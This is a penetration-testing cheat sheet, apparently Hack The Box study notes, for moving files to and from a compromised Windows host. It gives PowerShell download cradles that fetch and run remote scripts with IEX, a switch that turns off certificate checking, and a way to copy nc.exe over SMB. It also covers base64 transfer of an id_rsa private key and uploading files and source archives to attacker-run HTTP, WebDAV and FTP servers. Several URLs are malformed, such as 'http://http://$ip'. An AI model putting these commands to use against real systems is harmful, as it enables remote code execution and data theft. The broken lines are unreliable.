## Download
#### Net.WebClient 
```powershell
(New-Object Net.WebClient).DownloadFile('http://$ip','<Output>')
(New-Object Net.WebClient).DownloadFileAsync('http://$ip','<Output>')
(New-Object Net.WebClient).DownloadFile('http://$ip','<Output>') -UseBasicParsing

IEX(New-Object Net.WebClient).DownloadString('http://$ip')
(New-Object Net.WebClient).DownloadString('http://$ip') | IEX
(New-Object Net.WebClient).DownloadString('http://$ip') -UseBasicParsing| IEX
```

Possible issues and fixes:
1. Errors stemming from Internet Explorer in `Net.WebClient `can be fixed with                   `-UseBasicParsing`
2. Untrusted SSL Certificate issues can be fixed with the following:`[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}`

####  Invoke-WebRequest
``` Powershell
iwr http://http://$ip/PowerUp.ps1 -o PowerUp.ps1
curl http://http://$ip/PowerUp.ps1 -o PowerUp.ps1
wget http://http://$ip/PowerUp.ps1 -o PowerUp.ps1
```
#### SMB
```bash
impacket-smbserver share -smb2support $(pwd)/share
impacket-smbserver share -smb2support $(pwd)/share -user adot -password adot
```

```powershell
copy \\http://$ip\share\nc.exe
net use n: \\http://$ip\share /user:adot adot
```
#### FTP
```bash
python3 -m pyftpdlib --port 21
```

```powershell
(New-Object Net.WebClient).DownloadFile('ftp://http://$ip/file.txt', 'C:\Users\Public\ftp-file.txt')
IEX(New-Object Net.WebClient).DownloadString('ftp://$ip')
```

```powershell
C:\htb> echo open http://$ip > ftpcommand.txt
C:\htb> echo USER anonymous >> ftpcommand.txt
C:\htb> echo binary >> ftpcommand.txt
C:\htb> echo GET file.txt >> ftpcommand.txt
C:\htb> echo bye >> ftpcommand.txt
C:\htb> ftp -v -n -s:ftpcommand.txt
ftp> open http://$ip
Log in with USER and PASS first.
ftp> USER anonymous

ftp> GET file.txt
ftp> bye

C:\htb>more file.txt
This is a test file
```
##### Base64 Conversion
```bash
md5sum id_rsa
cat id_rsa |base64 -w 0;echo
```

```powershell
[IO.File]::WriteAllBytes("C:\Users\Public\id_rsa",[Convert]::FromBase64String("LS0tLS1..."))

Get-FileHash C:\Users\Public\id_rsa -Algorithm md5
```

## Upload
#### Web Uploads
```bash
python3 -m uploadserver
```
[PSUpload.ps1](https://github.com/juliourena/plaintext/blob/master/Powershell/PSUpload.ps1)
```powershell
IEX(New-Object Net.WebClient).DownloadString('http://$ip/PSUpload.ps1')
Invoke-FileUpload -Uri http://http://$ip:8000/upload -File C:\Windows\System32\drivers\etc\hosts


$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
```
#### WebDav (SMB restrictions)
```bash
wsgidav --host=0.0.0.0 --port=80 --root=$(pwd) --auth=anonymous 
```

```powershell
dir \\http://$ip\DavWWWRoot
copy C:\Users\john\Desktop\SourceCode.zip \\http://$ip\DavWWWRoot\
```
#### FTP
```bash
python3 -m pyftpdlib --port 21 --write
```

```powershell
(New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
```

```powershell
C:\htb> echo open 192.168.49.128 > ftpcommand.txt
C:\htb> echo USER anonymous >> ftpcommand.txt
C:\htb> echo binary >> ftpcommand.txt
C:\htb> echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt
C:\htb> echo bye >> ftpcommand.txt
C:\htb> ftp -v -n -s:ftpcommand.txt
ftp> open 192.168.49.128

Log in with USER and PASS first.


ftp> USER anonymous
ftp> PUT c:\windows\system32\drivers\etc\hosts
ftp> bye
```
#### PowerShell Base64 Encode & Decode
```powershell
[Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))

Get-FileHash "C:\Windows\system32\drivers\etc\hosts" -Algorithm MD5 | select Hash
```

```bash
echo IyBDb3B5cmln... | base64 -d > hosts

md5sum hosts 
```

